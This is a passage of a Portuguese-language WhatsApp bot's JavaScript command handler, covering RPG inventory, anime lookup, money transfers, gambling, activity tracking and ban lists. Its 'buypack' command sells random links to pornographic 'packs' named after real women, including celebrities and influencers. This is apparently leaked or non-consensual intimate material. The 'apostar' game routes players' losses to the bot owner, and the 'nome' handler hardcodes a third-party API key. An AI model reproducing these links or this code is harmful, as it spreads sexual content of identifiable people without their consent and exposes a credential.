          sendButton(from, capti, 'venda', but)                    
          break       
	

case 'inventario':
case 'inventário':
 if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
const useLevel32 = getLevelingLevel(sender)
var reqXp  = 20 * Math.pow(useLevel32, 2) + 150 * useLevel32 + 1000
done = monospace(`📍 𝗽𝗲𝗿𝗳𝗶𝗹 𝗮𝘃𝗲𝗻𝘁𝘂𝗿𝗲𝗶𝗿𝗼\n • Nome : ${pushname}\n • Rank : ${role}\n • Status : ${elit}\n • Xp : ${getLevelingXp(sender)}/${reqXp}\n • Level : ${getLevelingLevel(sender)}\n🎒 ɪɴᴠᴇɴᴛᴀʀɪᴏ :\n • Ouro : ${getEmas(sender)}🪙\n • cash : ${(getBalance(sender, balance))}💰\n • Ferro : ${getBesi(sender)}⛓️\n • Diamante : ${getDm(sender)}💎\n • Peixe : ${getFish(sender)}🎣`)
but = [{ buttonId: `${prefix}aventura`, buttonText: { displayText: 'Aventura' }, type: 1 }]
          sendButton(from, done, 'Inventário do usuário', but)
break



case 'anime':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply("Cadê o texto vida? kkkkk")
reply(mess.wait)
buscarByTobi = q
anu = await fetchJson(`https://www.luc4rio-rest-api.tk/api/educacional/buscaranimes?anime=${buscarByTobi}`)
img = await getBuffer(anu.Foto_anime)
loli.sendMessage(from, img, image, { quoted: say1, thumbnail:null})
break 

                     case 'nome':
                    addFilter(from)
                    if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const filebuffer = await loli.downloadMediaMessage(encmedia);
                        const form = new FormData();
                        form.append('img', filebuffer, { filename: 'tahu.jpg' })
                        get_result = await axios.post(`https://api.lolhuman.xyz/api/wait?apikey=ChOkYbOT8`, form.getBuffer(), { headers: { "content-type": `multipart/form-data; boundary=${form._boundary}` } })
                        reply(mess.wait)
                        get_result = get_result.data.result
                             ini_txt = `「 ⭐*HENPLAY*⭐」
`
                        ini_txt += `𝘼𝙣𝙞𝙡𝙞𝙨𝙩 𝙞𝙙 : ${get_result.anilist_id}\n`
                        ini_txt += `𝙈𝘼𝙇 𝙞𝙙 : ${get_result.mal_id}\n`
                        ini_txt += `𝙏𝙞́𝙩𝙪𝙡𝙤 𝙍𝙤𝙢𝙖𝙟𝙞 : ${get_result.title_romaji}\n`
                        ini_txt += `𝙏𝙞́𝙩𝙪𝙡𝙤 𝙣𝙖𝙩𝙞𝙫𝙤 : ${get_result.title_native}\n`
                        ini_txt += `𝙏𝙞𝙩𝙡𝙚 𝙀𝙣𝙜𝙡𝙞𝙨𝙝 : ${get_result.title_english}\n`
                        ini_txt += `𝙖𝙩 : ${get_result.at}\n`
                        ini_txt += `𝙀𝙥𝙞𝙨𝙤́𝙙𝙞𝙤 : ${get_result.episode}\n`
                        ini_txt += `𝙎𝙚𝙢𝙚𝙡𝙝𝙖𝙣𝙘̧𝙖 : ${get_result.similarity}`
                        await loli.sendMessage(from, { url: get_result.video }, video, {quoted: say1, thumbnail:null, caption: ini_txt })
                    } else {
                        reply(`Envie uma imagem com a legenda ${prefix + command} ou marque a imagem que já foi enviada`)
                    }
                    break


case 'darmoney':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply("Só meu dono")
const numeroUang = args[0].replace('@','')
const prolxpp = Number(numeroUang)
const uangLimite1 = args[1]
const darmoneyUang = mek.message[type].contextInfo.mentionedJid[0]
if (uangLimite1 <= 1) return reply(`Precisa dar no minímo 1 limit`)
if (isNaN(uangLimite1)) return reply(`[❗] USE ASSIM\n ${prefix + comando} @5521971702453 5`)
if (!numeroUang) return reply(`[❗] USE ASSIM\n ${prefix + comando} @5521971702453 5`)
const idUang = numeroUang + '@s.whatsapp.net'
var found = false
Object.keys(uang).forEach((i) => {
if(uang[i].id === idUang){
found = i
}
})
if (found !== false) {
uang[found].uang += Number(uangLimite1)
const updated = uang[found]
fs.writeFileSync('./datauser/uang.json',JSON.stringify(uang))
const verMoney = checkATMuser(darmoneyUang)
const verMoney2 = checkATMuser(sender)
addKoinUser(sender, prolxpp, verMoney2)
const result = `
╭─❒ 「 Sucesso! 」 ❒
├ *🦈 ID : *${createSerial(8)}*
├ *🦈 Horário : *${moment().format('DD/MM/YY HH:mm:ss')}*
├ *🦈 Usúario : *@${updated.id.replace('@s.whatsapp.net','')}*
├ *🦈 Dinheiro:* ${verMoney}
└❏`
console.log(uang[found]);
reply(result)
} else {
reply(`[❗] Desculpe ${pushname}, este ${numeroUang} número não está registrado no bot...`)
}
break

case 'apostar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(`SOMENTE EM GRUPOS`)
const dinheiro234 = checkATMuser(sender)
const checkxpr = checkATMuser(sender, dinheiro) 
const quantidader = `300000`
if (checkxpr <= quantidader) return reply(`Você não possui licença para jogar, obtenha uma quando tiver ${quantidader} de dinheiro.\n\nSeu dinheiro: ${checkxpr}`)
if (args.length !== 1) return reply('Especifique a quantidade de dinheiro para apostar.')
if (Number(args[0]) >= checkxpr || Number(args[0]) >= dinheiro) return reply(`Você não pode apostar uma quantidade de dinheiro maior do que a você tem, e nosso limite de apostas é de ${quantidader} dinheiro por vez!\n\nSeu dinheiro: ${checkxpr}`)
if (Number(args[0]) < 300000) return reply(`O minimo para se apostar é de 300000 dinheiro`)
if (isNaN(args[0])) return reply('Para apostar use apenas números, nada de inserir letras, a menos que queira perder todo o XP que tenha.')
const double = Math.floor(Math.random() * 7) + 1
const nrolxp = Number(-args[0])
const prolxp = double + Number(args[0])
if (double == 1) {
await reply(`🔪BANG!!!💣\n\nVocê perdeu na roleta-russa, causando uma perca de ${nrolxp} em seu dinheiro.`)
addKoinUser(sender, nrolxp, dinheiro234)
addKoinUser(`${OwnerNumber}@s.whatsapp.net`, prolxp)
} else if (double == 2) {
await reply(`🙌🏻SALVO😇\n\nVocê não levou um tiro e ganhou ${prolxp} dinheiro`)
addKoinUser(sender, prolxp, dinheiro234)
} else if (double == 3) {
await reply(`👎🏼BAAAAH MÁ SORTE😔\n\nPerdeu ${nrolxp} KKK Continua apostando pra perder mais otário kkkkkkkkkkkkkkk`)
addKoinUser(sender, nrolxp, dinheiro234)
addKoinUser(`${OwnerNumber}@s.whatsapp.net`, prolxp)
} else if (double == 4) {
await reply(`👍🏼MUITA SORTE!!!😬\n\nVocê pulou o muro, e se salvou da polícia.\nGanhou ${prolxp} Dinheiro, Meu soldado anti prisão!`)
addKoinUser(sender, prolxp, dinheiro)
} else if (double == 5) {
await reply(`💀 WASTED - SE FODEU ⚰️\n\nAcabou perdendo ${nrolxp} em seu dinheiro, pra ganhar, aposte mais alto.`)
addKoinUser(sender, nrolxp, dinheiro234)
addKoinUser(`${OwnerNumber}@s.whatsapp.net`, prolxp)
} else if (double == 6) {
await reply(`✨CONGRATULATIONS💫\n\nVocê finalmente ganhou, receba seus ${prolxp} de dinheiro`)
addKoinUser(sender, prolxp, dinheiro234)
await requestCash(sender)
}
break

case 'rankmoney':
case 'rankdinheiro':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
bo = args[0]
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
_registered.sort((a, b) => (a.name < b.name) ? 1 : -1)
uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
let rankDinheiro = '🏆【DINHEIRO】🏆\n\n'
let nomNumberRank = 0
try {
for (let i = 0; i < 10; i++) {
nomNumberRank++
rankDinheiro += `
*${nomNumberRank}º*🥇 : @${uang[i].id.replace('@s.whatsapp.net', '')}
╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
│ ➣ ${groupName}
│ ➣ Dinheiro: _${uang[i].uang}_💰
╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
}
await reply(rankDinheiro)
} catch (err) {
console.error(err)
await reply(`Precisa ter mais Usuários registrados`)
}
break
case 'viplist':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const vip123 = fs.readFileSync('./src/gifvip.mp4')
tkks = '╭────*「 *𝙑𝙄𝙋𝙨 💎* 」\n'
for (let V of vipp) {
tkks += `│+  @${V.split('@')[0]}\n`
}
tkks += `│+ Total : ${vipp.length}\n╰──────────────────────────────────────`
await loli.sendMessage(from, vip123,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: tkks })
break
case 'vermoney':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Use ${prefix + comando} @tag`)
const verMoneyki = mek.message[type].contextInfo.mentionedJid[0]
const verMoneyMencionador = checkATMuser(verMoneyki)
mentioned = mek.message[type].contextInfo.mentionedJid[0]
const feijoada = loli.contacts[mentioned] != undefined ? loli.contacts[mentioned].vname || loli.contacts[mentioned].notify: undefined
reply(`き⃟💰_Adquirir o saldo na conta do ${feijoada}_💰️⃟ き\n\nき⃟💰 - Dinheiro: ${verMoneyMencionador}`)
break

case 'rankativo':
					if (!isGroup) return reply(mess.only.group)
					if(groupIdscount.indexOf(from) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
					var ind = groupIdscount.indexOf(from)
					if(countMessage[ind].numbers.length < 15) return reply('*Necessita do registro mínimo de 15 usuarios*')
					countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? 1 : -1)
					mentioned_jid = []
					boardi = '*🔥Ranking dos membros mais ativos🔥*\n\n'
					try {
						for (let i = 0; i < 15; i++) {
							if (i == 0) boardi += `${i + 1}º 🥇 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 1) boardi += `${i + 1}º 🥈 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 2) boardi += `${i + 1}º 🥉 : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 3) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 4) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 5) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 6) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 7) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 8) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 9) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 10) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 11) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 12) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 13) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							else if (i == 14) boardi += `${i + 1}º : @${countMessage[ind].numbers[i].jid.split('@')[0]}\n*Mensagens: ${countMessage[ind].numbers[i].messages}*\n*Comandos dados: ${countMessage[ind].numbers[i].cmd_messages}*\n\n`
							mentioned_jid.push(countMessage[ind].numbers[i].jid)
						} 
						mentions(boardi, mentioned_jid, true)
					} catch (err) {
						console.log(err)
						await loli.sendMessage(from, `*É necessário 3 jogadores para se construir um ranking*`, text, {quoted: say1})
					}
				break
case 'rpgmenu':
case 'menurpg':
addFilter(from)
const rpg1 = fs.readFileSync('./src/rpgmenu.mp4')
loli.sendMessage(from, rpg1,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
🎒 𝗶𝗻𝘃𝗲𝗻𝘁𝗮𝗿𝗶𝗼 :
 • Cash: $${(getBalance(sender, balance))}💰
 • Ouro : ${getEmas(sender)}🪙
 • Ferro : ${getBesi(sender)}⛓️
 • Diamante : ${getDm(sender)}💎
 • Peixe : ${getFish(sender)}🎣
🏔️ 𝗠𝗲𝗻𝘂 𝗥𝗣𝗚
 • joinrpg
 • minerar
 • pescar
 • aventura
 • inventario
 • ranklevel
 • buymoney
 • buylimite
 
🛒 𝘃𝗲𝗻𝗱𝗲𝗿 𝗶𝗻𝘃𝗲𝗻𝘁𝗮𝗿𝗶𝗼
 • venderpeixe
 • venderferro
 • venderouro
 • venderdiamante`})
break

case 'checkativo':
					if (!isGroup) return reply(mess.only.group)
                                        if (!isGroupAdmins) return reply(mess.only.admin)
					if(groupIdscount.indexOf(from) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
					var ind = groupIdscount.indexOf(from)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Marque o número que deseja puxar a atividade*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if(numbersIds.indexOf(mentioned[0]) >= 0) {
						var indnum = numbersIds.indexOf(mentioned[0])
						mentions(`*Consulta da atividade de @${mentioned[0].split('@')[0]} no grupo*\n*Mensagens: ${countMessage[ind].numbers[indnum].messages}*\n*Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}*`, mentioned, true)
					}
					else {
						mentions(`*Consulta da atividade de @${mentioned[0].split('@')[0]} no grupo*\n*Mensagens: 0*\n*Comandos dados: 0*`, mentioned, true)
					}
					break
case 'filtroativo':
					if(!isGroupAdmins) return reply(mess.only.admin)
					if(!isGroup) return reply(mess.only.group)
					teks = `*Membros que só mandaram ${args[0]} mensagens:*\n`
					mem = []
					if(groupIdscount.indexOf(from) < 0) return reply('*O bot não tem ainda dados sobre o grupo*')
					for(let obj of groupMembers) {
						if(args[0] != 0) { 
							if(numbersIds.indexOf(obj.jid) >=0) { 
								var indnum = numbersIds.indexOf(obj.jid)
								if(countMessage[ind].numbers[indnum].messages == args[0]) {
									teks+= `*➣ @${obj.jid.split('@')[0]}*\n`
									mem.push(obj.jid)
								}
							}
						} else {
							if(numbersIds.indexOf(obj.jid) < 0) { 
								teks+= `*➣ @${obj.jid.split('@')[0]}*\n`
								mem.push(obj.jid)
							}
						}
					}
					mentions(teks, mem, true)
					break

case 'atividade':
					try{
						if(!isGroupAdmins) return reply(mess.only.admin)
						if(isGroup && groupIdscount.indexOf(from) >= 0) {
							var ind = groupIdscount.indexOf(from)
							teks = `*Atividade dos membros do grupo:*\n`
							mem = []
							for(let obj of groupMembers) {
								if(numbersIds.indexOf(obj.jid) >=0) {
									var indnum = numbersIds.indexOf(obj.jid)
									teks += `➣ *@${countMessage[ind].numbers[indnum].jid.split('@')[0]}*\n*Mensagens: ${countMessage[ind].numbers[indnum].messages}\n*Comandos: ${countMessage[ind].numbers[indnum].cmd_messages}*\n`
								} else {
									teks += `➣ *@${obj.jid.split('@')[0]}*\n*Mensagens: 0*\n*Comandos: 0*\n`
								}
								mem.push(obj.jid)
							}
							loli.sendMessage(from, teks, extendedText, {quoted: say1, contextInfo:{mentionedJid: mem}})
						} else return reply('*Nada foi encontrado*')
					} catch (e){
						console.log(e)
					}
					break
case 'permaban':
                                        if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isGroup) return reply(mess.only.admin)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						var ind = dbids.indexOf(from)
						if(isDontBack) {
							if(dontback[ind].actived) return reply('*Já está ativo*')
							dontback[ind].actived = true
						} else {
							dontback.push({
								groupId: from,
								actived: true,
								number: []
							})
						}
						fs.writeFileSync('./src/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
						reply(`Ativou com sucesso o recurso de permaban neste grupo✔️`)
					} else if (Number(args[0]) === 0) {
						var ind = dbids.indexOf(from)						
						if(isDontBack) {
							dontback[ind].actived = false
						} else {
							dontback.push({
								groupId: from,
								actived: false,
								number: []
							})
						}
						fs.writeFileSync('./src/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
						reply(`Desativou com sucesso o recurso de permaban neste grupo✔️`)
					} else {
						reply('1 para ativar, 0 para desativar')
					}
				break
case 'permabanadd':
                                        if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isGroup) return reply(mess.only.admin)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Diga o numero sem espaço, + ou traço')
					if (isNaN(args[0])) return reply('Diga o numero sem espaço, + ou traço')
					var ind = dbids.indexOf(from)
					if(isDontBack) {
						var numind = dontback[ind].number.indexOf(args[0])
						if(numind >= 0) return reply('*Esse Número ja esta incluso*')
						dontback[ind].number.push(args[0])
					} else {
						dontback.push({
							groupId: from,
							actived: false,
							number: [args[0]]
						})
					}
					fs.writeFileSync('./src/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
					reply(`*Número adicionado a lista de permaban*`)

				break
case 'permabanrm':
                                        if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isGroup) return reply(mess.only.admin)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Diga o numero sem espaço, + ou traço')
					if (isNaN(args[0])) return reply('Diga o numero sem espaço, + ou traço')
					var ind = dbids.indexOf(from)
					if(!isDontBack) return reply('*Nenhum Número não foi adicionado*')
					var numind = dontback[ind].number.indexOf(args[0])
					if(numind < 0) return reply('*Esse número não está incluso*')
					dontback[ind].number.splice(numind, 1)
					fs.writeFileSync('./src/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
					reply(`*Número removido a lista de permaban*`)
				break
case 'permabanlist':
                                        if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
					if (!isGroup) return reply(mess.only.admin)
					if (!isGroupAdmins) return reply(mess.only.admin)
					var ind = dbids.indexOf(from)
					if(!isDontBack) return reply('*Nenhum Número não foi adicionado*')
					teks = '*Números que vou moer na porrada se voltar 😡:*\n'
					for(i=0;i<dontback[ind].number.length;++i) {
						teks += `➤ *${dontback[ind].number[i]}*\n`
					}
					teks += '*Esses ai vou passar a katana do zadik 🥵*'
					reply(teks)
				break

case 'verlevel':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Use ${prefix + command} @pessoa`)
const verMoneyki1 = mek.message[type].contextInfo.mentionedJid[0]
const userXp256 = getLevelingXp(verMoneyki1)
mentioned = mek.message[type].contextInfo.mentionedJid[0]
const feijoada2 = loli.contacts[mentioned] != undefined ? loli.contacts[mentioned].vname || loli.contacts[mentioned].notify: undefined
reply(`き⃟🎉🎊_Adquirir o xp na conta do ${feijoada2}_き⃟🎉🎊\n\nき⃟🎉🎊 - XP: ${userXp256}`)
break

case 'buypack':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (m.isGroup) return reply(`*Você so pode resgatar no privado do bot*`)
payout2 = 1
const valorPack = 100000
const buyPacks = valorPack * payout2
const nrolxp12 = Number(-100000)
if ( checkATMuser(sender) <= buyPacks) return reply(`[❗] Desculpe ${pushname} você não tem dinhero suficiente\nvalor do premiun : ${valorPack} mil`)
if ( checkATMuser(sender) >= buyPacks) {
addKoinUser(sender, nrolxp12)
confirmATM(sender)
var pornoByHori = [
"Michelle Rabbit\nhttps://mega.nz/folder/FXB0ELpS#CaCYgD8f8YNPc_dL4JjtDA ",
"Dripxxx\nhttps://mega.nz/folder/UdEjxYbA#2dGzAJq9JR8Qy8C8Y3VirQ",
"Sia Sibéria\nhttps://drive.google.com/drive/u/0/mobile/folders/1pOfYV7ZFqumnZpB-6eu03fHsByBJgNWt",
"Nicole Bum\nhttps://drive.google.com/drive/mobile/folders/1MRARgrA4GIcw14MGNpr5NxAKJTcnLjra",
"Love Lilah\nhttps://drive.google.com/drive/u/0/mobile/folders/145OnVBWuA54ZwfW5zL6WOQ7pQ41-fBx3 ",
"Taty Maia\nhttps://mega.nz/folder/i841xSqT#8sP2vyffUbS1RjQ_keNYoA/folder/O9hX1QSR ",
"Me1adinha\nhttps://accounts.google.com/ServiceLogin?service=lh2&passive=1209600&osid=1&continue=https://photos.google.com/share/AF1QipOjkWA-SYuXFsR17RGK0D0ZagmAP0_nK_kJnhpllW9WLj19YdLWGr0rDFLnncXVxQ?key%3DZVBtdV9YN2RmUUtkUkg2d2dMSzRKd3B5dEtMTWVn&followup=https://photos.google.com/share/AF1QipOjkWA-SYuXFsR17RGK0D0ZagmAP0_nK_kJnhpllW9WLj19YdLWGr0rDFLnncXVxQ?key%3DZVBtdV9YN2RmUUtkUkg2d2dMSzRKd3B5dEtMTWVn&authuser=0\n(Via Google Fotos) ",
"Mari Ávila\nhttps://drive.google.com/drive/u/0/mobile/folders/1lVU8GgLTHfPoYUh5ZJ1oj5gluiTRmgB5 ",
"Feh Galvão\nhttps://mega.nz/folder/OxQiHJAA#8dGkVcq08YtonYSJQgZFfQ/folder/etx0QRQT ",
"Marina Mui\nhttps://mega.nz/folder/nhxWCQhC#jefLXWFJiqCXMtj6wEEN4A ",
"Sophia Carracini\nhttps://drive.google.com/drive/u/0/mobile/folders/1mIpBq3amINT9am9yxQGlbz7dd8-NMN_o ",
"Maria Eugênia\nhttps://drive.google.com/drive/u/0/mobile/folders/10kdyiz9TCQuqEQXK_78KJJjG-zd4ywi3 ",
"Skylar Vox\nhttps://mega.nz/folder/XIQTSKzR#_0vLyBUESlCj3l5HCCUkQg ",
"Neiva Mara\nhttps://mega.nz/folder/PZZxQABC#IVO1DL-zczyMd1Kr83sDBw ",
"Amorazz\nhttps://mega.nz/folder/6kpT0IoT#Zqin16-ASUvoXgoEK6BsIw ",
"Nayara\nhttps://drive.google.com/drive/u/0/mobile/folders/1JpJdDtuI408EpCmoQalcOC8oz3szAxqE ",
"Megnutt\nhttps://mega.nz/folder/UAJE0DQT#gCEzz702Amr2rdqSWmshMA/folder/lQx21JjC ",
"Littl Misfit\nhttps://mega.nz/#F!QvhW2RiB!kog5LiL5dOU_115ZEVpcGg!UyhkGLCL ",
"Anitta\nhttps://drive.google.com/drive/u/0/mobile/folders/1K5NZNNJPGVo3FGuWIjZ0jNoJ-8Gh9hG3 ",
"MC Princesa\nhttps://drive.google.com/drive/u/0/mobile/folders/1Zsj66cMEPgQTcT91VenAkl9L1TAuguSF ",
"MC Pipokinha\nhttps://drive.google.com/drive/u/0/mobile/folders/1X7u7cj8MKj1cE6hM2_mkQe9bOF8M2npm ",
"Lana Rhoades\nhttps://mega.nz/folder/JEkWhaoZ#lho_3rS4nhf28tGtyvImCw ",
"Belle Delphine\nhttps://drive.google.com/drive/mobile/folders/1IzUUxQO6owpvW9r5Yj6xJ_711yTtlZg9 ",
"Venomous Dolly\nhttps://mega.nz/folder/pxYAXLjI#QnZHek_zGQDz5ct9d63Bmg ",
"MC Mirella\nhttps://seulink.online/qOkcdS\n(Esse ta com encurta) ",
"LoverLaci\nhttps://mega.nz/folder/yRIHgQ5A#euOpAQNEcZiej5uBuxjBkw/folder/XEQWSZBC ",
"Victoria Matosa\nhttps://drive.google.com/drive/mobile/folders/1x2j-SglJX-nezdBuc4WhpYleZO2c8Tl9 ",
"Segredos Da Ana\nhttps://www.mediafire.com/folder/tcpjkncy4as5f/d.gg\n(FONTE: Wakai T) ",
"Letícia Shirayuki\nhttps://www.mediafire.com/file/2a4kq8pmxc3je71/Let%25C3%25ADcia_Shirayuki.zip/file ",
"KITTYXKUM\nhttps://mega.nz/folder/f4xDSS7R#_5ZrSNVwLJ4nEUdEJxoijw ",
"Kinechan\nhttps://mega.nz/folder/GgxRQCaS#kdT7IidrqwgbggnpZOkMHA ",
"Grazi Mourão\nhttps://mega.nz/folder/2hwgwYpI#kUTsXqrwDNFeKcDhTINz-w ",
"https://mega.nz/folder/aU1wVTZR#6_P4jZGjUZmHqC5Fu2Y78Q",
"https://photos.app.goo.gl/Tqvfv8yVdp3FaUnX9",
"https://photos.app.goo.gl/g685WWL4T7BcZssk8",
"https://photos.app.goo.gl/gNxLbJHGVzeWY9iS9",
"https://photos.app.goo.gl/phyRpNFLcAtsknfJ7",
"https://photos.app.goo.gl/TBbkjGGdAVHjPFt5A",
"https://photos.app.goo.gl/Jr4Qk1dFSJepPdRc7",
"https://mega.nz/folder/aU1wVTZR#6_P4jZGjUZmHqC5Fu2Y78Q",
"https://photos.app.goo.gl/Tqvfv8yVdp3FaUnX9",
"https://photos.app.goo.gl/phyRpNFLcAtsknfJ7",
"https://photos.app.goo.gl/g685WWL4T7BcZssk8",
"https://photos.app.goo.gl/TBbkjGGdAVHjPFt5A",
"https://photos.app.goo.gl/gNxLbJHGVzeWY9iS9",
"https://photos.app.goo.gl/Jr4Qk1dFSJepPdRc7",
"Polonesa Do Hype\nhttps://drive.google.com/drive/u/0/mobile/folders/1yA4MOOhL1Qjfx8BOtjZptyNDgZPxzYAC",
"Ashley Tervort\nhttps://mega.nz/folder/X5wQwIbK#579uPWLNfCuUDuXvuIJ3aA ",
"Ashley Alban\nhttps://mega.nz/folder/9eBBBQZb#pi0kaL6zqRYq3SoSJHUJpQ ",
"Emília Bunny\nhttps://mega.nz/folder/q1pkBJoI#5ZiKfZhaKIUg9ea0eS6EYw ",
"Maru Karv\nhttps://mega.nz/folder/tHoC2CaY#bPf5ZHzM89nq-oCr0Civdw ",
"Evilena\nhttps://drive.google.com/drive/u/0/mobile/folders/1j5OR2qsYQ9uKrO2V2ywdpdUpooBlIJCo ",
"Bambi Doe\nhttps://mega.nz/folder/IxgyhZJI#Rd8bzK3_Ri2I3LUvy2Tf6Q ",
"Mulher Melão\nhttps://mega.nz/folder/is8w1Q7a#XmaNa0PNl6J-JS9VXneDJg ",
"Aline Faria\nhttps://drive.google.com/drive/u/0/mobile/folders/1QEaiSu9SFeoV__Obo42252zj-WQaEZxQ ",
"Rafaela Nery\nhttps://drive.google.com/drive/u/0/mobile/folders/1dYfY3QTybo_gFeNE-oQsxN45VnZ7HRW0 ",
"Remy LaCroix\nhttps://mega.nz/folder/sTxmzDAb#_0igusp-mS454WIEh_lGqg ",
"Mayakayagaia\nhttps://mega.nz/folder/5MsATbYI#V-90W2qijBk3N5YzJTgfHQ ",
"Bella Thorne\nhttps://mega.nz/folder/okw0gYLL#O6-OqnJhRYTbHiMJbNqI3Q ",
"Canela Skin\nhttps://mega.nz/folder/vN5XBIIZ#m7P5H4J_B5HcsYrf26tmoQ ",
"Hailey Queen\nhttps://mega.nz/folder/FFlgXBIT#8X5NYUFWkTjVDUqmwXSVow/folder/pc1yVbyA ",
"Adriana Chechik\nhttps://mega.nz/folder/1XgFnKyJ#HETOSi3Qi8Kwckbm2FBXDw ",
"Dripxxx\nhttps://mega.nz/folder/UdEjxYbA#2dGzAJq9JR8Qy8C8Y3VirQ ",
"Steffy Moreno\nhttps://mega.nz/folder/QkYARZ7J#vtktDmYALs5wwcImYy8tnw ",
"Angelic Videos\nhttps://mega.nz/folder/XgMRQYAL#GidekeyDkkEDFWit2kAJ_g "]
var pornkkkByHoriNekkkk = pornoByHori[Math.floor(Math.random() * pornoByHori.length)]
loli.sendMessage(from, `${pornkkkByHoriNekkkk}`, text, {contextInfo :{text: 'hi', "forwardingScore": 1000000000, isForwarded: true, sendEphemeral: true, "externalAdReply": {"title": `Packs porno😋🧐 by © 𝙯𝙖𝙙𝙞𝙠`, "body": "", "previewType": "PHOTO", "thumbnailUrl": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0pI7lX1qdefwAOq8jKZxKlgQLGSuiXRx88YI1yy9-Wcem6Wjw151-kWc&s=10", "thumbnail": img2}}})
}
break
case 'hentaiteste':                 
				 data = fs.readFileSync('./database/arquivos/hentaipack.js');
                 jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
